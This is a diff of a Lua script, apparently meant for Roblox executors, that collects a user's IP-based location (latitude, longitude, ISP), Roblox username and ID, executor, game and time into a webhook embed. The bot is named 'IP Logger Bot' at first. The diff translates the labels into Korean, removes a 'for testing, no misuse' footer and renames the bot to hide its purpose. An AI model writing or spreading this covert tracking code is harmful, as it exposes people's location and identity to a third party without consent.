@@ -80,18 +80,18 @@ local embed = {
         {name = "위도 (lat)", value = tostring(ipData.lat or "N/A"), inline = true}, -- 추가 
         {name = "경도 (lon)", value = tostring(ipData.lon or "N/A"), inline = true}, -- 추가 
         {name = "ISP", value = ipData.isp or ipData.org or "N/A", inline = false}, 
-        {name = "Roblox 유저", value = extra.username .. " (" .. tostring(extra.userid) .. ")", inline = false}, 
-        {name = "Executor", value = extra.executor, inline = false}, 
+        {name = "닉네임", value = extra.username .. " (" .. tostring(extra.userid) .. ")", inline = false}, 
+        {name = "실행기", value = extra.executor, inline = false}, 
         {name = "PlaceId", value = tostring(extra.placeid), inline = false}, 
         {name = "게임 이름", value = extra.gamename, inline = false}, -- 추가 
         {name = "실행 시간", value = extra.time, inline = false} 
     }, 
-    footer = {text = "테스트용 | 악용 금지"} 
+    footer = {text = "IP 로그"} 
 } 
 
 local payload = { 
     embeds = {embed}, 
-    username = "IP Logger Bot", 
+    username = "스크립트 IP 로그", 
 } 
 
 -- 전송 
